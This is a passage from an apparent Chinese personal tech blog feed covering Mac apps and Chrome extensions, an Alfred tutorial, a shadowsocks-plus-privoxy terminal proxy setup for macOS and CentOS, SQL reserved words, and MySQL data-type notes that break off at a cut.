        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006y8mN6ly1g8cn0syzb9j30zk0k0q6l.jpg" alt=""></p><a id="more"></a><h1 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h1><h2 id="1-Notebook"><a href="#1-Notebook" class="headerlink" title="1. Notebook"></a>1. <a href="https://www.zoho.com/notebook/notebook-for-mac.html" target="_blank" rel="noopener">Notebook</a></h2><p>这是一款非常漂亮的笔记本，虽然我目前使用的是印象笔记和马克飞象，但我真的也非常喜欢这款笔记，我想我以后会尝试使用。<br><img src="https://www.zoho.com/notebook/images/mobile-inspired-gestures.png" alt="notebook"></p><h2 id="2-iPic"><a href="#2-iPic" class="headerlink" title="2. iPic"></a>2. <a href="http://toolinbox.net/iPic/" target="_blank" rel="noopener">iPic</a></h2><p>这是一款上传图片到各种图床的软件，对于经常使用 Markdown 写博客的用户来说，这简直就是福音，但坏消息是这款软件免费的只能使用微博图床，其他的图床都是是付费的。<br><img src="https://ww4.sinaimg.cn/middle/006tKfTcgy1fewqw208xmg30j60aske8.gif" alt="ipic"></p><h2 id="3-Mounty"><a href="#3-Mounty" class="headerlink" title="3. Mounty"></a>3. <a href="http://enjoygineering.com/mounty/" target="_blank" rel="noopener">Mounty</a></h2><p>由于 macOS 不支持 NTFS 的读写，因此通常需要使用 Paragon NTFS 或 Tuxera NTFS 来读写 NTFS 格式的磁盘，但这两款软件都是付费的，而免费版的 Mounty 同样能做到，因此我选择 Mounty。<br><img src="http://enjoygineering.com/mounty/img/example.png" alt="Mounty"></p><h2 id="4-iStat-Menus"><a href="#4-iStat-Menus" class="headerlink" title="4. iStat Menus"></a>4. <a href="https://github.com/Chris911/iStats" target="_blank" rel="noopener">iStat Menus</a></h2><p>一款实时查看电脑运行状态的工具，包括 CPU、硬盘、电池、网络等。<br><img src="http://ohx73ws1b.bkt.clouddn.com/istat.png" width="400"></p><h1 id="终端"><a href="#终端" class="headerlink" title="终端"></a>终端</h1><h2 id="1-httpie"><a href="#1-httpie" class="headerlink" title="1. httpie"></a>1. httpie</h2><p>一款终端高亮格式化显示的http解析工具<br><img src="https://raw.githubusercontent.com/jakubroztocil/httpie/master/httpie.png" alt="httpie"></p><h2 id="2-mycli"><a href="#2-mycli" class="headerlink" title="2. mycli"></a>2. mycli</h2><p>一款自动完成终端 MySQL 命令高亮与提示的工具<br><img src="https://raw.githubusercontent.com/dbcli/mycli/master/screenshots/main.gif" alt="mycli demo"></p><h1 id="Chrome-插件"><a href="#Chrome-插件" class="headerlink" title="Chrome 插件"></a>Chrome 插件</h1><h2 id="1-Octotree"><a href="#1-Octotree" class="headerlink" title="1. Octotree"></a>1. <a href="https://chrome.google.com/webstore/detail/octotree/bkhaagjahfmjljalopjnoealnfndnagc" target="_blank" rel="noopener">Octotree</a></h2><p>Github 侧边栏目录结构<br><img src="http://upload-images.jianshu.io/upload_images/1094967-b6c0f72ef039a5c2?imageMogr2/auto-orient/strip" alt="octotree"></p><h2 id="2-GitHub-Hovercard"><a href="#2-GitHub-Hovercard" class="headerlink" title="2. GitHub Hovercard"></a>2. <a href="https://chrome.google.com/webstore/detail/github-hovercard/mmoahbbnojgkclgceahhakhnccimnplk" target="_blank" rel="noopener">GitHub Hovercard</a></h2><p>鼠标悬停显示更多信息，包括用户的摘要信息、commit 的摘要信息等<br><img src="http://upload-images.jianshu.io/upload_images/1094967-335a21063edfa79d?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="GitHub Hovercard"><br><img src="http://upload-images.jianshu.io/upload_images/1094967-a11d109a7a6ac19b?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="repo"></p><h2 id="3-Isometric-Contributions"><a href="#3-Isometric-Contributions" class="headerlink" title="3. Isometric Contributions"></a>3. <a href="https://chrome.google.com/webstore/detail/isometric-contributions/mjoedlfflcchnleknnceiplgaeoegien?hl=zh-CN" target="_blank" rel="noopener">Isometric Contributions</a></h2><p>3D 显示用户的仓库提交历史<br><img src="http://upload-images.jianshu.io/upload_images/1094967-c7e914bc8cc17bfd?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="commit record"></p><hr><p>查看更多 Mac 精品软件可前往 <a href="https://github.com/jaywcjlove/awesome-mac" target="_blank" rel="noopener">Awesome Mac</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Mac 效率神器 - Alfred</title>
      <link href="/post/alfred/"/>
      <url>/post/alfred/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g87cudg3j3j30i208cjse.jpg" alt=""></p><a id="more"></a><p>21世纪最重要的是什么？效率啊！今天我们就来讲一款让你效率提升300%的神器 Alfred，上图就是它的样子。Are you kidding me?! 就一个搜索框就能提升300%的效率？这不就是 OS X 自带的 Spotlight 嘛，你比罗永浩还能吹！别急，别急，待我慢慢道来。</p><h1 id="基础应用"><a href="#基础应用" class="headerlink" title="基础应用"></a>基础应用</h1><h2 id="1-搜索引擎"><a href="#1-搜索引擎" class="headerlink" title="1. 搜索引擎"></a>1. 搜索引擎</h2><p><img src="http://ohx73ws1b.bkt.clouddn.com/alfred_1.gif" alt="Web Search"></p><h2 id="2-打开文件"><a href="#2-打开文件" class="headerlink" title="2. 打开文件"></a>2. 打开文件</h2><p><img src="http://ohx73ws1b.bkt.clouddn.com/alfred_2.gif" alt="Open File"></p><h2 id="3-打开应用"><a href="#3-打开应用" class="headerlink" title="3. 打开应用"></a>3. 打开应用</h2><p><img src="http://ohx73ws1b.bkt.clouddn.com/alfred_3.gif" alt="Applicatioin"></p><h2 id="4-查找文件"><a href="#4-查找文件" class="headerlink" title="4. 查找文件"></a>4. 查找文件</h2><p><img src="http://ohx73ws1b.bkt.clouddn.com/alfred_4.gif" alt="Find File"></p><h2 id="5-计算器"><a href="#5-计算器" class="headerlink" title="5. 计算器"></a>5. 计算器</h2><p><img src="http://ohx73ws1b.bkt.clouddn.com/alfred_5.gif" alt="Calculator"></p><h1 id="进阶应用"><a href="#进阶应用" class="headerlink" title="进阶应用"></a>进阶应用</h1><h2 id="1-自定义搜索"><a href="#1-自定义搜索" class="headerlink" title="1. 自定义搜索"></a>1. 自定义搜索</h2><p>在搜索框中输入「Alfred」回车，依次点击 Features -&gt; Web Search<br><br>以下是我的一些自定义搜索配置，安装 Alfred 软件后打开下列「alfred://」开头的 URL 即可自动添加</p><blockquote><p>Docker Hub alfred://customsearch/Docker%20Store/ds/utf8/nospace/https%3A%2F%2Fstore.docker.com%2Fsearch%3Fq%3D%7Bquery%7D</p><p>GitHub<br>alfred://customsearch/GitHub/github/utf8/nospace/https%3A%2F%2Fgithub.com%2Fsearch%3Fq%3D%7Bquery%7D%26ref%3Dopensearch</p><p>PHP 中文手册<br>alfred://customsearch/PHP%20Manual/p/utf8/nospace/http%3A%2F%2Fphp.net%2Fsearch.php%3Fshow%3Dquickref%26pattern%3D%7Bquery%7D</p><p>MDN 手册<br>alfred://customsearch/MDN%20Web%20Docs/mdn/utf8/nospace/https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fsearch%3Fq%3D%7Bquery%7D</p><p>StackOverflow<br>alfred://customsearch/StackOverflow/so/utf8/nospace/http%3A%2F%2Fstackoverflow.com%2Fsearch%3Fq%3D%7Bquery%7D</p><p>Google 翻译为中文<br>alfred://customsearch/Google%E7%BF%BB%E8%AF%91%E4%B8%AD%E6%96%87/g2cn/utf8/nospace/https%3A%2F%2Ftranslate.google.com%2F%23auto%2Fzh-CN%2F%7Bquery%7D</p><p>Google 翻译为英文<br>alfred://customsearch/Google%20%E7%BF%BB%E8%AF%91%E8%8B%B1%E6%96%87/g2en/utf8/nospace/https%3A%2F%2Ftranslate.google.com%2F%23auto%2Fen%2F%7Bquery%7D</p></blockquote><h2 id="2-历史剪切板"><a href="#2-历史剪切板" class="headerlink" title="2. 历史剪切板"></a>2. 历史剪切板</h2><p><img src="http://ohx73ws1b.bkt.clouddn.com/alfred_6.gif" alt="Clipbord"></p><h2 id="3-代码片段"><a href="#3-代码片段" class="headerlink" title="3. 代码片段"></a>3. 代码片段</h2><p>我们经常会输入手机号、邮箱、身份证号等常用信息，程序员可能会有一些常用代码，每次手动输入不仅麻烦，而且经常输错，现在，用「Snippets」功能来拯救你吧。比如，我以关键字「demo」作为”Hello world”的关键字，依次点击 Features-&gt;Snippets，按照图示设置即可<br><img src="http://ohx73ws1b.bkt.clouddn.com/alfred_setting.jpg" alt="Snippets"><br>最终的效果就是这样的：<br><img src="http://ohx73ws1b.bkt.clouddn.com/alfred_7.gif" alt="Snippets"></p><p>如果你想每次都输出不同内容时，就需要用到占位符了，比如我想输出当前时间，你可以这样<br><img src="http://inews.gtimg.com/newsapp_match/0/2868860882/0" alt=""><br>时间的格式不是你想要的？在系统设置中的地区与语言中自定义你的时间吧:)</p><h2 id="4-系统命令"><a href="#4-系统命令" class="headerlink" title="4. 系统命令"></a>4. 系统命令</h2><p>Alfred 支持多个系统命令，如 lock 锁定电脑，emptytrash 清空回收站，restart 重启电脑，quit 退出指定应用等，这些都可以在 Features-&gt;System 中查看及设置。个人不太推荐使用 lock 和 emptytrash 以外的命令，使用第三方程序来关机或退出应用可能会导致一些意外情况，比如我昨天使用 quit iterm2 导致composer 命令无法执行，zsh 中加载了composer 的插件，最终导致整个终端都无法正常使用。</p><h2 id="5-执行终端命令"><a href="#5-执行终端命令" class="headerlink" title="5. 执行终端命令"></a>5. 执行终端命令</h2><p>Alfred 默认调用系统内置的 Terminal，可在 Features-&gt;Terminal/Shell 中参照<a href="https://github.com/stuartcryan/custom-iterm-applescripts-for-alfred修改配置，将" target="_blank" rel="noopener">https://github.com/stuartcryan/custom-iterm-applescripts-for-alfred修改配置，将</a> Terminal 修改为 iTerm2。</p><p><img src="http://ohx73ws1b.bkt.clouddn.com/alfred_8.gif" alt="Terminal"></p><h1 id="高级应用"><a href="#高级应用" class="headerlink" title="高级应用"></a>高级应用</h1><p>Alfred 真正的黑科技是 workflow，话不所说，直接上图：</p><h2 id="1-翻译"><a href="#1-翻译" class="headerlink" title="1. 翻译"></a>1. 翻译</h2><p><img src="http://ohx73ws1b.bkt.clouddn.com/alfred_9.gif" alt="Translate"></p><h2 id="2-时间戳转换"><a href="#2-时间戳转换" class="headerlink" title="2. 时间戳转换"></a>2. 时间戳转换</h2><p><img src="http://ohx73ws1b.bkt.clouddn.com/alfred_10.gif" alt="Timestamp Convert"></p><h2 id="3-色值转换"><a href="#3-色值转换" class="headerlink" title="3. 色值转换"></a>3. 色值转换</h2><p><img src="http://ohx73ws1b.bkt.clouddn.com/alfred_11.gif" alt="Color Show"></p><h2 id="4-Hash"><a href="#4-Hash" class="headerlink" title="4. Hash"></a>4. Hash</h2><p><img src="http://ohx73ws1b.bkt.clouddn.com/alfred_12.gif" alt="Hash"></p><p>我使用的 workflow 已上传至百度云盘，链接:<a href="https://pan.baidu.com/s/1eVyVe7DR9_NH_9vqafys9w" target="_blank" rel="noopener">https://pan.baidu.com/s/1eVyVe7DR9_NH_9vqafys9w</a>  密码:c1z9</p><hr><p>参考文章：<br><img src="https://kuaibao.qq.com/s/20180211A01CU900?refer=cp_1026%200%20%E5%88%86%E4%BA%AB%20%20%E6%89%AB%E6%8F%8F%E4%BA%8C%E7%BB%B4%E7%A0%81" alt="Mac效率神器Alfred系列教程-Snippets文字扩展"></p>]]></content>
      
      
      <categories>
          
          <category> 日常技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令行下使用代理</title>
      <link href="/post/proxy-on-terminal/"/>
      <url>/post/proxy-on-terminal/</url>
      
        <content type="html"><![CDATA[<p><img src="http://ohx73ws1b.bkt.clouddn.com/proxy.png" alt="proxy"></p><a id="more"></a><p>对于经常需要依赖国外资源的开发者，终端的下载速度让人抓狂，诸如常见的 wget、curl、git、brew 等命令行工具超慢，甚至无法获取资源，这就需要搭建一个科学上网利器，例如目前流行的shadowsocks，我们配置好 shadowsocks 服务器端后，安装对应系统的客户端便可，然而当你构建的时候还是会很慢，这时你发现系统自带的终端或 iTerm 2 是不走 Socks5 。</p><p>因在终端下不支持Socks5代理，只支持http代理，这就需要曲径通幽了。</p><h1 id="Mac平台下安装"><a href="#Mac平台下安装" class="headerlink" title="Mac平台下安装"></a>Mac平台下安装</h1><blockquote><p>环境：<br>OS X 10.12.5<br>ShadowsocksX-NG 1.5.0</p></blockquote><p>OS X 10.11之后较新的系统默认设置下不会安装成功。苹果在新系统中加入了SIP安全机制，他会阻止第三方程序向系统目录内（/System，/bin，/sbin，/usr(除了/usr/local)）进行写操作，sudo也不行。办法是先把SIP关了，等装好软件配置好后再打开SIP。或者改用其他软件。</p><p>关闭SIP也麻烦，遂用privoxy这个经典软件，它刚好就是安装在/usr/local内，不需要关闭SIP也可以正常使用。</p><h3 id="1-privoxy安装"><a href="#1-privoxy安装" class="headerlink" title="1. privoxy安装"></a>1. privoxy安装</h3><p><code>brew install privoxy</code></p><h3 id="2-privoxy配置"><a href="#2-privoxy配置" class="headerlink" title="2. privoxy配置"></a>2. privoxy配置</h3><p><code>vim /usr/local/etc/privoxy/config</code><br>在文件末尾输入：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">listen-address <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">8118</span></span><br><span class="line">forward-socks5 / localhost:<span class="number">1086</span> .</span><br></pre></td></tr></table></figure><p>第一行设置privoxy监听任意IP地址的8118端口(privoxy的默认端口)。第二行设置本地socks5代理客户端端口，注意不要忘了最后有一个空格和点号。<br><em>旧版 ShadowsocksX 创建的 「SOCKS5 代理」端口 默认是 1080，新版 ShadowsocksX-NG 创建的 「SOCKS5 代理」端口 默认改成 1086 升级后别忘了修改代理插件对应的端口。</em></p><h3 id="3-启动privoxy"><a href="#3-启动privoxy" class="headerlink" title="3. 启动privoxy"></a>3. 启动privoxy</h3><p>因为没有安装在系统目录内，所以启动的时候需要打全路径。<br><code>sudo /usr/local/sbin/privoxy /usr/local/etc/privoxy/config</code></p><h3 id="4-测试shadowsocks"><a href="#4-测试shadowsocks" class="headerlink" title="4. 测试shadowsocks"></a>4. 测试shadowsocks</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">telnet <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">1086</span></span><br><span class="line">telnet <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8118</span></span><br></pre></td></tr></table></figure><h3 id="5-privoxy使用"><a href="#5-privoxy使用" class="headerlink" title="5. privoxy使用"></a>5. privoxy使用</h3><p>在<code>~/.bashrc</code>或<code>~/zshrc</code>中加入以下开关函数，方便使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">proxy_off</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unset</span> http_proxy</span><br><span class="line">    <span class="keyword">unset</span> https_proxy</span><br><span class="line">    <span class="keyword">echo</span> -e <span class="string">"已关闭代理"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">proxy_on</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    export no_proxy=<span class="string">"localhost,127.0.0.1,localaddress,.localdomain.com"</span></span><br><span class="line">    export http_proxy=<span class="string">"http://127.0.0.1:8118"</span></span><br><span class="line">    export https_proxy=$http_proxy</span><br><span class="line">    <span class="keyword">echo</span> -e <span class="string">"已开启代理"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行<code>source ~/.bashrc</code>或<code>source ~/.zshrc</code>使配置立即生效。</p><h3 id="7-开启代理测试"><a href="#7-开启代理测试" class="headerlink" title="7. 开启代理测试"></a>7. 开启代理测试</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">~  <span class="selector-tag">proxy_on</span></span><br><span class="line">已开启代理</span><br><span class="line">~  <span class="selector-tag">curl</span> <span class="selector-tag">ip</span><span class="selector-class">.cn</span></span><br><span class="line">当前 <span class="selector-tag">IP</span>：8<span class="selector-class">.8</span><span class="selector-class">.8</span><span class="selector-class">.8</span> 来自：美国</span><br></pre></td></tr></table></figure><h1 id="Linux下的安装"><a href="#Linux下的安装" class="headerlink" title="Linux下的安装"></a>Linux下的安装</h1><blockquote><p>环境：<br>CentOS 7.3.1611</p></blockquote><h3 id="1-安装shadowsocks、pip、privoxy"><a href="#1-安装shadowsocks、pip、privoxy" class="headerlink" title="1. 安装shadowsocks、pip、privoxy"></a>1. 安装shadowsocks、pip、privoxy</h3><p>请先确保你已经添加了EPEL源，<code>yum repolist</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# yum repolist</span><br><span class="line">已加载插件：fastestmirror</span><br><span class="line">Loading<span class="built_in"> mirror </span>speeds <span class="keyword">from</span> cached hostfile</span><br><span class="line"> * base: mirrors.nju.edu.cn</span><br><span class="line"> * elrepo: mirrors.ircam.fr</span><br><span class="line"> * epel: mirrors.tuna.tsinghua.edu.cn</span><br><span class="line"> * extras: mirrors.njupt.edu.cn</span><br><span class="line"> * updates: mirrors.njupt.edu.cn</span><br><span class="line">源标识           源名称                                                状态</span><br><span class="line">base/7/x86_64    CentOS-7 - Base                                        9,363</span><br><span class="line">elrepo           ELRepo.org<span class="built_in"> Community </span>Enterprise Linux Repository - el    194</span><br><span class="line">epel/x86_64      Extra Packages <span class="keyword">for</span> Enterprise Linux 7 - x86_64        11,873</span><br><span class="line">extras/7/x86_64  CentOS-7 - Extras                                        446</span><br><span class="line">updates/7/x86_64 CentOS-7 - Updates                                     2,089</span><br><span class="line">repolist: 23,965</span><br></pre></td></tr></table></figure><p>如果尚未添加，则使用<code>sudo yum -y install epel-release</code>添加EPEL。</p><p>使用以下命令安装shadowsocks、pip、privoxy：<br><code>$ sudo yum -y install python-pip privoxy</code><br><code>$ sudo pip install shadowsocks</code></p><h3 id="2-配置"><a href="#2-配置" class="headerlink" title="2. 配置"></a>2. 配置</h3><h4 id="2-1-配置ss"><a href="#2-1-配置ss" class="headerlink" title="2.1 配置ss"></a>2.1 配置ss</h4><p><code>$ sudo mkdir -p /etc/shadowsocks</code><br><code>$ sudo vi /etc/shadowsocks/config.json</code><br>config.json配置内容为：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="string">"server"</span>:<span class="string">"bot02.rom.mk"</span>,（你的代理服务器<span class="built_in">IP</span>或域名地址）</span><br><span class="line"> <span class="string">"server_port"</span>:<span class="number">443</span>,（代理服务器上监听的端口号）</span><br><span class="line"> <span class="string">"local_port"</span>:<span class="number">1080</span>,（本地的监听端口号）</span><br><span class="line"> <span class="string">"password"</span>:<span class="string">"xxxx"</span>,（代理服务器的密码）</span><br><span class="line"> <span class="string">"timeout"</span>:<span class="number">600</span>,</span><br><span class="line"> <span class="string">"method"</span>:<span class="string">"aes-256-cfb（加密方式）"</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><em>若未配置local_port，则默认为1080</em></p><h4 id="2-2-启动ss"><a href="#2-2-启动ss" class="headerlink" title="2.2 启动ss"></a>2.2 启动ss</h4><p>后台运行shadowsocks：<br>启动：<code>sslocal -c /etc/shadowsocks/config.json -d start</code><br>停止：<code>sslocal -c /etc/shadowsocks/config.json -d stop</code></p><p>但这样每次重启系统的时候都需要执行启动命令来启动ss，我们可以通过以下方法设置开机自动启动：<br><code>vi /usr/lib/systemd/system/sslocal.service</code><br>内容如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Shadowsocks Server</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">PermissionsStartOnly=true</span><br><span class="line">ExecStartPre=/bin/mkdir -p /run/shadowsocks</span><br><span class="line">ExecStartPre=/bin/chown nobody:nobody /run/shadowsocks</span><br><span class="line">ExecStart=/usr/bin/sslocal -c /etc/shadowsocks/config.json</span><br><span class="line">Restart=on-abort</span><br><span class="line">User=root</span><br><span class="line">Group=root</span><br><span class="line">UMask=0027</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><p>执行命令<code>systemctl start sslocal</code>启动ss，<br>执行命令<code>systemctl status sslocal</code>查看ss状态，如果是<code>active</code>，执行<code>systemctl enable sslocal</code>设置开机自启。<br>执行<code>reboot</code>重启系统，然后使用<code>systemctl status sslocal</code>查看启动情况，如有异常请根据日志提示解决。</p><p>这样我们就能很方便的通过系统命令<code>systemctl</code>来管理ss进程了。</p><h4 id="2-2-privoxy配置"><a href="#2-2-privoxy配置" class="headerlink" title="2.2 privoxy配置"></a>2.2 privoxy配置</h4><p><code>$ sudo vi /etc/privoxy/config</code><br>在文件末尾输入：<br><code>forward-socks5 / 127.0.0.1:1080 .</code></p><p>启动privoxy<br><code>$ sudo service privoxy restart</code></p><p>同样的，执行<code>systemctl enable privoxy</code>设置开机启动privoxy</p><h3 id="3-测试"><a href="#3-测试" class="headerlink" title="3. 测试"></a>3. 测试</h3><p>参照Mac下的配置设置开关函数。<br>使用Telnet测试shadowsocks和privoxy是否正常<br><code>telnet 127.0.0.1 1080</code><br><code>telnet 127.0.0.1 8118</code><br>可以连接成功说明正常运行。</p><p>执行以下命令查看实际效果</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">~  <span class="selector-tag">proxy_on</span></span><br><span class="line">已开启代理</span><br><span class="line">~  <span class="selector-tag">curl</span> <span class="selector-tag">ip</span><span class="selector-class">.cn</span></span><br><span class="line">当前 <span class="selector-tag">IP</span>：8<span class="selector-class">.8</span><span class="selector-class">.8</span><span class="selector-class">.8</span> 来自：美国</span><br><span class="line">~  <span class="selector-tag">proxy_off</span></span><br><span class="line">已开启代理</span><br><span class="line">~  <span class="selector-tag">curl</span> <span class="selector-tag">ip</span><span class="selector-class">.cn</span></span><br><span class="line">当前 <span class="selector-tag">IP</span>：121<span class="selector-class">.69</span><span class="selector-class">.50</span><span class="selector-class">.42</span> 来自：北京市 电信通</span><br></pre></td></tr></table></figure><h1 id="原理解析"><a href="#原理解析" class="headerlink" title="原理解析"></a>原理解析</h1><p>我们终端中的http和https请求通过开关函数转发到了privoxy的8118端口，然后被privoxy转换为socks5协议转发到shadowsocks的1080或1086端口，最后本地运行的shadowsocks客户端与远程shadowsocks服务器通信，从而实现命令下的代理功能。</p><hr><p>参考文章：</p><ol><li><a href="https://lvii.gitbooks.io/outman/content/ss.mac.html" target="_blank" rel="noopener">shadowsocks on Mac OS X</a></li><li><a href="http://www.cashqian.net/blog/001486989831982332565298e4942a2bb8f56b08f9d2475000" target="_blank" rel="noopener">Mac命令行终端下使用shadowsocks翻墙</a></li><li><a href="http://ian.wang/196.htm" target="_blank" rel="noopener">Shadowsocks+Privoxy打造Linux / Mac socks和http代理</a></li><li><a href="https://juejin.im/entry/58d29f6161ff4b006cb218d9" target="_blank" rel="noopener">使用 shadowsocks 加速 Mac 自带终端或 iTerm 2</a></li><li><a href="http://www.iosugar.com/2017/02/19/Mac-terminal-environment/" target="_blank" rel="noopener">Mac终端环境走代理</a></li><li><a href="http://www.guanxigo.com/cross-gfw-in-linux-terminal" target="_blank" rel="noopener">Linux终端下翻墙教程</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 日常技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 终端 </tag>
            
            <tag> Terminal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL保留字列表</title>
      <link href="/post/sql-reserved-words/"/>
      <url>/post/sql-reserved-words/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>SQL是由关键字组成的语言,关键字是一些用于执行SQL操作的特殊词汇词汇。在命名数据库、表、列和其他数据库对象时,一定不要使用这些关键字是一定要保留的。</p><p>本附录列出主要DBMS中最常用的保留字。请注意以下几点：</p><ul><li>关键字随不同的DBMS而变化,并非下面的所有关键字都被所有DBMS采用</li><li>许多DBMS扩展了SQL保留字,使其包含专门用于实现的术语。多数DBMS专用的关键字未列在下面。</li><li>为保证以后的兼容性和可移植性,应避免使用这些保留字,即使它们不不是你使用的DBMS的保留字。</li></ul><p><img src="http://ohx73ws1b.bkt.clouddn.com/QQ20170607-103406.png" alt=""></p><hr><p>来源：《SQL必知必会》（第4版）</p>]]></content>
      
      
      <categories>
          
          <category> 软件编程 </category>
          
          <category> MySQL </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MySQL知识点总结</title>
      <link href="/post/mysql-notes/"/>
      <url>/post/mysql-notes/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006y8mN6ly1g8cmfudal9j30p00b4gmd.jpg" alt=""></p><a id="more"></a><h2 id="一、-数据类型"><a href="#一、-数据类型" class="headerlink" title="一、 数据类型"></a>一、 数据类型</h2><p><img src="http://ohx73ws1b.bkt.clouddn.com/data%20type.png" alt="Alt text"></p><h3 id="1-1-选择优化的数据类型"><a href="#1-1-选择优化的数据类型" class="headerlink" title="1.1 选择优化的数据类型"></a>1.1 选择优化的数据类型</h3><ol><li>更小的通常最好：更小的数据占用更少的系统资源</li><li>使用内建的类型来存储合适的内容，如使用DATETIME或TIMESTAMP存储时间，而不是VARCHAR</li><li>尽量避免使用null，因为这会降低性能</li><li>TIMESTAMP只使用DATETIME的一半空间，并且会根据时区来自动更新，当TIMESTAMP设置默认值为CURRENT_TIMESTAMP和NOW()时，TIMESTAMP的值并不会随着更改某一字段而自动更改。</li></ol><h3 id="1-2-数据类型需要注意的"><a href="#1-2-数据类型需要注意的" class="headerlink" title="1.2 数据类型需要注意的"></a>1.2 数据类型需要注意的</h3><h4 id="1-2-1-数值型"><a href="#1-2-1-数值型" class="headerlink" title="1.2.1 数值型"></a>1.2.1 数值型</h4><ul><li>INT(11)其实并没有什么意义，它并不会限制数值的合法范围。</li><li><strong>DECIMAL类型主要用于存储精确的小数类型（如金额）</strong>，因为需要额外的空间和计算开销，因此只在对小数进行精确计算时才使用DECIMAL。</li><li>浮点类型在存储同样范围的值时，通常比DECIMAL使用更少的空间。</li></ul><h4 id="1-2-2-字符串型"><a href="#1-2-2-字符串型" class="headerlink" title="1.2.2 字符串型"></a>1.2.2 字符串型</h4><ul><li>VARCHAR使用更少的存储空间，但索引速度低于CHAR，VARCHAR需要额外的信息来保存长度信息。</li><li>使用VARCHAR(5)和VARCHAR(20)来存储’hello’的空间开销是一样的，但VARCHAR(20)会消耗更长的列，因此我们只分配真正需要的空间。</li><li><strong>使用枚举(ENUM)和SET代替字符串类型，在MySQL内部使用整数存储ENUM和SET类型，然后在做比较时转换为字符串</strong>。</li></ul><h4 id="1-2-3-日期时间型"><a href="#1-2-3-日期时间型" class="headerlink" title="1.2.3 日期时间型"></a>1.2.3 日期时间型</h4><ul><li>MySQL能存储的最小时间粒度为秒。</li><li><code>DATETIME([fsp])``TIMESTAMP[(fsp)]``TIME[(fsp)]</code>可设定一个0~6位的微秒时间。</li><li>DATETIME能保存大范围的值，精度为秒，可保存1001~9999年。该类型存储与时区无关，使用8个字节的存储空间。</li><li>TIMESTAMP只使用4个字节的存储空间，因此只能保存1970~2038年，MySQL中也提供了FROM_UNIXTIME()函数把Unix时间戳转换为日期，并提供了UNIX_TIMESTAMP()函数将日期转换为Unix时间戳。</li><li>MySQL 4.1及以上版本按照DATETIME的方式格式化显示TIMESTAMP的值，这只是显示上的区别，与4.1前的版本在存储上并没有区别。</li><li>TIMESTAMP默认为NOT NULL</li></ul><h4 id="1-2-4-位数据型"><a href="#1-2-4-位数据型" class="headerlink" title="1.2.4 位数据型"></a>1.2.4 位数据型</h4><p>从MySQL 